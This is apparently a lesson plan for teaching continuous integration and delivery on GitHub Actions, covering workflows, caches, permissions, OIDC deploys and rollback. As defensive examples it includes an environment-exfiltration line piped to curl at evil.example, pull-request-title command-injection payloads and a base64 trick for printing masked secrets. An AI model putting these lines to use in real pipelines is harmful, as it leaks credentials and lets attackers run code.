# github-actions-ci-cd: continuous integration and delivery, taught on GitHub Actions
kind: tool
aliases: github actions, ci/cd, continuous integration, continuous delivery
needs: git, docker
status: reviewed 2026-11-19 by independent agent, sources reopened, mirrors rerun
sources: docs.github.com/en/actions: contents (order), secure-use, workflow-dependency-lockfiles, dependency-caching,
  github_token, events-that-trigger-workflows, workflow-syntax,
  run-job-variations, create-postgresql-service-containers, re-run-workflows-and-jobs, enable-debug-logging,
  oidc, troubleshooting-required-status-checks; changelog 2023-02-02 (token default); securitylab preventing-pwn-requests;
  osv.dev GHSA-mrrh-fwg8-r2c3; martinfowler.com continuousIntegration (outline 2), feature-toggles; dora.dev metrics
unverified: no runner: repository halves from the pages named, rule mirrors run here; judgement: 12 (never cancel a deploy), 14 (rehearsed rollback)

## Promise
Give your own service a pipeline that tests every change before merge, ships an image, deploys with approval and no stored cloud keys, and cannot be turned against you.

## The one idea
CI is a contract: nothing reaches `main` unless a clean machine built and tested it the same way. Picture: a turnstile. Where it breaks: it runs the repository's code, so whoever changes a workflow or its actions walks through, secrets and all.

## In production
- Required checks on every pull request; `main` builds an image per commit and deploys through approved environments by OIDC.

## Teaching order
1. What CI is for: every change built and tested the same way, from a clean checkout, before merge; tests runnable by one command; a red `main` fixed at once.
2. A workflow's anatomy: `.github/workflows/ci.yml`; `on`, `jobs`, `runs-on`, `steps`; `uses:` an action against `run:` a command; `${{ }}`, the `github` context, `if:`.
3. Events and filters: `push`, `pull_request`, `branches`, `paths`, `workflow_dispatch`, `schedule`; pushes by `GITHUB_TOKEN` start no runs.
4. The runner: a fresh virtual machine per job, nothing kept; tool versions set by `setup-*` actions; a test database as a `services:` container.
5. Speed and hand-offs: `needs:`, job `outputs` from `$GITHUB_OUTPUT`; `actions/cache` keyed on `hashFiles` of the package lockfile, `restore-keys`, branch scopes; `upload-artifact`, `download-artifact`: a cache may vanish, an artifact is the product.
6. A matrix: `strategy.matrix` across versions, `fail-fast`, `include`, `exclude`.
7. Required checks: branch protection or a ruleset (git 7) names jobs, optionally "up to date before merging"; a renamed job or a path-skipped workflow leaves the check pending.
8. Secrets and the token: `${{ secrets.X }}` (repository, environment, organization), masked only verbatim, withheld from fork pull requests; `GITHUB_TOKEN` per job; `permissions: contents: read` on top, raised per job.
9. Untrusted code: actions fixed by a workflow lockfile (`actions.lock`) where offered, else by full commit SHA, bumped by Dependabot; `${{ github.event.pull_request.title }}` in `run:` is injection: `env:`; `pull_request_target` with the head checked out; the `workflow_run` split.
10. An image: `docker/login-action` (`ghcr.io` needs `packages: write`), `docker/build-push-action`; tagged with `github.sha`; built on pull requests, pushed only from `main`.
11. Deploying: `environment: production` with required reviewers, allowed branches, its secrets released on approval; OIDC: `id-token: write`, the cloud trusts a `sub` claim and returns short-lived credentials.
12. Concurrency and reuse: `concurrency` keyed on `github.ref`, `cancel-in-progress: true` for checks, never for a running deploy; reusable workflows (`on: workflow_call`) against composite actions.
13. A failed run: the first red step's log read upward; the step's shell and exit code; failed jobs re-run (same commit) with debug logging; reproduced with the same `run:` lines.
14. Delivery practice: small changes merged daily; deploy separated from release by short-lived release toggles; rehearsed rollback (`workflow_dispatch`, previous SHA); DORA's change lead time, deployment frequency, change fail rate, failed deployment recovery time, rework rate, per service, never targets.

## State and danger
- [2,9] `.github/workflows/*.yml` on each branch; a pull request runs its own edited copy. Safe: `CODEOWNERS` owning `.github/`, with code-owner review required.
- [8,11] Secrets cannot be read back but can be printed: `echo "$TOKEN" | base64` or a JSON secret escapes masking. Safe: one value per secret, `::add-mask::` derived ones, rotate on a leak.
- [5,9] A poisoned cache runs in every job restoring it. Only trusted triggers (`push`, `schedule`, `workflow_dispatch`...) write the default branch's; others (`pull_request_target`, `issue_comment`) read unless `cache-mode` grants write. Safe: no write `cache-mode` there; no cache in release builds.
- [8] A token with `contents: write` and a bypassable rule can push to `main`. Safe: read-only default, no bypass.
- [10,14] Registry and Git release tags can be moved (retargeted tags spread the tj-actions secret dump). Safe: commit-SHA image tags, protected tags, a new tag per fix.

## Step notes
### 1
Need: The tests pass on my laptop; why would a clean machine say otherwise?
Show: tests reading a git-ignored `settings.json`: `git status` clean, tests OK; in `git clone . /tmp/clean`: `FileNotFoundError: ... 'settings.json'` (run here). A runner's checkout is that clone.
Explain: CI builds only what is committed; whatever your laptop adds by accident, a clean checkout removes.
Try: build: one command running every test, done when it passes in a fresh clone; predict: which ignored files their tests read.
### 2
Need: I wrote the jobs in order; why did they all start at once?
Show: their run graph: jobs "run in parallel by default" (workflow syntax). Here PyYAML on lint, test, build `needs: [lint, test]`, deploy `needs: build` prints waves `['lint', 'test']`, `['build']`, `['deploy']`; the keys read `['name', True, 'jobs']`: YAML 1.1 makes `on` `True` (a trap for their own scripts, not for GitHub).
Explain: A workflow is a graph of jobs, each on its own runner, steps in order; only `needs:` orders jobs.
Try: predict: their workflow's waves, then check the graph; fix: a deploy that started before the tests ended.
### 3
Need: I pushed to `feature/login`; why did nothing run?
Show: here, 23 lines mirroring the filter cheat sheet (`*` "does not match the / character"): `branches: ['*']`: `feature/login` NO RUN; `paths: ['src/**', '!src/docs/**']`: a PR touching only `README.md` or `src/docs/` NO RUN. Their repo: `'**'` runs.
Explain: Events meet the `on:` filters before any machine starts; only `**` crosses a slash; a later `!` takes paths out.
Try: predict: which workflows five recent commits started, then check; fix: [3,7] a docs-only PR stuck pending.
### 4
Need: Job one installed the tool; why does job two say "command not found"?
Show: their repo: job `a` writes `/tmp/x`; job `b` (`needs: a`): `No such file or directory`. Services: the docs' postgres waits on `--health-cmd pg_isready`. Here, PostgreSQL 16 started without waiting (`pg_ctl -W`), queried at once: refused 10 times of 10; ready about 35 ms later by `pg_isready`, longer in a fresh container that first creates its database.
Explain: Each job gets a fresh machine; it installs, starts and waits for what it needs.
Try: build: tests against a `services:` database, done when ten re-runs are green; predict: what job two sees of job one.
### 5
Need: The pipeline is green; why did the deploy use last week's dependencies?
Show: here, a mirror of Dependency caching (`cache-hit` only on an exact key; caches never change). Key `deps-Linux`, install skipped on a hit: the lockfile moves to deps-B; runs still hit deps-A. Key with the lockfile's hash, restore-key `deps-Linux-`: one miss restores A, installs B, saves; then hits B.
Explain: A cache is immutable, keyed, restored from the run's branch, its base or the default branch, and may vanish: its key changes when its content should. An artifact is the product.
Try: predict: which branch's cache their PR restores, then read the log; fix: [5] a key without the lockfile hash.
### 6
Need: I added one `include:` entry; why six jobs, not five?
Show: here, the documented rules (exclude first; an include joins every original combination it overwrites nothing in, else is a new job) on the docs' `fruit` × `animal` example: their six jobs; two banana jobs, not one. Their repo: under `fail-fast: true` one red job cancels the rest.
Explain: A matrix is a cross product, cut by partial-match excludes, patched by includes; `fail-fast` cancels siblings.
Try: predict: their matrix's job count, then compare; decide: which versions their users run.
### 7
Need: The PR only changed the README; why can't I merge it?
Show: their repo: `test` required; a README-only PR under step 3's `paths`: no run, "Waiting for status to be reported"; a job skipped by `if:` reports success (Troubleshooting required status checks).
Explain: A required check is a name the merge waits for; no report for the latest commit, no merge.
Try: fix: [3,7] the pending check, done when docs-only PRs merge; predict: renaming `test` with PRs open.
### 8
Need: The deploy job only added `id-token: write`; why can't it check out the code?
Show: here, a mirror of the documented calculation (default, workflow, then job; naming one scope sets the rest "to none"; fork PRs lose write): workflow `contents: read`, a job adding `id-token: write` gets only `{id-token: write}`. Their repo: `gh label create` under `contents: read`: `Resource not accessible by integration`.
Explain: Each job's token is computed afresh; its `permissions:` replaces the workflow's, so it names all it needs.
Try: apply: `contents: read` on top, raised per job, done when all pass; predict: [8] what a fork's PR gets from `secrets.X`.
### 9
Need: It is only a pull request title; how can it run a command?
Show: here, the runner mirrored (`${{ }}` pasted in, then `bash -e`): title `fix typo"; echo "INJECTED as $(id -un)" #` prints `INJECTED as root` (the runner's user there); via `env: TITLE`, plain text. Their repo: the docs' `a"; ls $GITHUB_WORKSPACE"` via `env:` logs as text (Secure use).
Explain: `${{ }}` is pasted in before the shell parses: data becomes code; an environment variable stays a value.
Try: fix: [9] every `${{ github.event.* }}` in `run:` moved to `env:`; decide: `pull_request_target` (with the head checked out, its build scripts get the secrets and a write token) or the `workflow_run` split.
### 10
Need: We deploy `:latest`; why did the rollback ship today's bug?
Show: here with git (registry tags move alike; tj-actions' did): `git tag -f v1` onto a commit adding `env | curl -d @- evil.example`: a fresh clone of `v1` gets the curl; the old SHA does not. Their repo: two pushes, two SHA tags, `latest` on the second.
Explain: A tag is a movable pointer; a SHA or digest names content, so deploys and rollbacks name the SHA.
Try: apply: images pushed from `main` tagged with `github.sha`, one per merge; predict: what `:latest` pulls mid-release.
### 11
Need: We removed the cloud keys; why is the deploy job refused now?
Show: here, `sub` built by the OIDC reference against trust `repo:org/app:ref:refs/heads/main`: a push to `main` passes; with `environment: production` the job presents `repo:org/app:environment:production`: refused. Their repo: a required reviewer holds the run; secrets come after approval.
Explain: The job trades a short-lived signed token naming its repository, ref or environment for credentials, if a claim matches the trust.
Try: fix: [11] the refused token; decide: which branches may deploy to production.
### 12
Need: Five merges in five minutes; which reached production?
Show: here, the documented rule simulated (a new run cancels the group's pending one), deploys of 6 minutes: no cancel-in-progress: c1, then c5; c2-c4 never run. With it: c1-c4 cancelled mid-deploy. Their repo: two quick pushes to a PR, the first run cancelled.
Explain: A group holds one running and one waiting run; the newest takes the waiting slot; `cancel-in-progress` kills the running one.
Try: apply: checks grouped on `github.ref` with cancel; decide: a reusable workflow or composite action for two services.
### 13
Need: The log says tests failed; why is the step green?
Show: here, `tests | tee log` under the docs' two shells: no `shell:` (`bash -e {0}`): `1 failed, 41 passed`, exit 0; `shell: bash` (`-eo pipefail`): exit 1. Their repo: the same step both ways.
Explain: A step fails on a non-zero exit; without `pipefail` a pipe's status is its last command's.
Try: fix: [13] their pipes, done when a failing test reddens the step; explain: why a re-run (same `GITHUB_SHA`) never picks up a later fix.
### 14
Need: The release broke checkout; how fast are we back, and will the old version start?
Show: here, `sqlite3`: v2's migration renames `name`; redeploying v1: `no such column: name`. If v2 only adds the column, v1 serves. Their repo: a `workflow_dispatch` input naming the SHA, rehearsed, timed.
Explain: Rollback runs old code on new data: expand now, contract later; a toggle hides a feature with no deploy.
Try: build: the rehearsed rollback, done when a deliberate bad release is undone, timed; decide: which DORA measures they record.

## Believable numbers
- [5] A cache not read for 7 days is removed; a repository's cache space is capped, raised by its owners (look
  up). [6] At most 256 jobs per matrix. [13] A re-run within 30 days, same `GITHUB_SHA` (docs.github.com, 2026-11).

## Go deep, leave for later
- Deep steps: 5, 8, 9, 14 (what a fresh runner keeps through caches and artifacts; which token and secrets untrusted input reaches; deploy apart from release with a rehearsed rollback).
- Later: self-hosted runners, artifact attestations, merge queues, monorepos, other CI systems.

## Never omit
- Every workflow begins `permissions: contents: read`; every third-party action locked or pinned.
- Look up when planned: the token's default permissions (read-only for accounts and repositories made since 2 February 2023; older ones kept theirs), workflow lockfiles (in preview), each action's release and SHA, plan limits on environments and caches, the OIDC subject format (customisable), the cloud's OIDC steps.

## Wrong beliefs
- [3] "`pull_request` tests my branch's last commit" (it tests the merge with the base).
- [5] "A cache hit means current dependencies" (caches are immutable: a key without the lockfile hash hits for ever).
- [9] "`@v4` always means the same code" (tags move; a full SHA fixes that action, not the actions it calls).
- [9] "`pull_request_target` is `pull_request` for forks" (it runs in the base repository's context, with its secrets).
- [11] "OIDC stores my cloud key at GitHub" (none stored; the cloud checks a short-lived signed token's claims).
- [14] "Deploying rarely is safer" (DORA: speed and stability are not trade-offs; small batches help both).

## Failures to diagnose
- [3,7] A required check pending forever: the workflow skipped by `paths`, or the job renamed.
- [8] `Resource not accessible by integration`: the job's `permissions` lack the scope.
- [4,13] Green locally, red on the runner: an untracked file or another tool version.
- [13] A red test in a green step: a pipe without `pipefail` under the default shell.
- [11] The cloud refuses the token: `sub` does not match the trust condition, or no `id-token: write`.

## Practice and project
Guided: the learner's repository. Alone: harden an unsafe workflow. Project: the learner's pipeline, checks to production behind approval through OIDC; finish line: a broken test cannot merge, a fork gets no secrets, every action pinned, a deliberate bad release rolled back by the rehearsed path.

## Mastery ladder
- Use: add a job to a workflow and make it a required check.
- Explain: walk a workflow saying which code runs with which token and secrets.
- Build: the project.
- Design: choose and defend triggers, permissions, environments and release practice for a stated team.

## Words to own
[1] continuous integration; [2] workflow, job, step, action, runner; [3] trigger; [4] hosted runner; [5] cache, artifact;
[6] matrix; [7] required status check; [8] repository secret, GITHUB_TOKEN, permissions; [9] pinning, script injection, pull_request_target;
[10] image tag; [11] environment, OpenID Connect; [12] concurrency group, reusable workflow; [13] re-run, debug logging;
[14] release toggle, change lead time, change fail rate
